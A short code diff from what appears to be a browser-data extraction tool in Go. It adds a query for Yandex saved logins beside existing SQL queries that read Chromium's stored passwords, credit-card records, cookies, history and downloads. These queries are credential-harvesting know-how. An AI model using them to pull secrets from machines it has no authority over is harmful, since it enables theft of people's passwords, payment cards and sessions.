@@ -71,6 +71,7 @@ func (d *Data) addSource(Sources []item.Item) {
 const (
 	queryChromiumCredit   = `SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards`
 	queryChromiumLogin    = `SELECT origin_url, username_value, password_value, date_created FROM logins`
+	queryYandexLogin      = `SELECT action_url, username_value, password_value, date_created FROM logins`
 	queryChromiumHistory  = `SELECT url, title, visit_count, last_visit_time FROM urls`
 	queryChromiumDownload = `SELECT target_path, tab_url, total_bytes, start_time, end_time, mime_type FROM downloads`
 	queryChromiumCookie   = `SELECT name, encrypted_value, host_key, path, creation_utc, expires_utc, is_secure, is_httponly, has_expires, is_persistent FROM cookies`
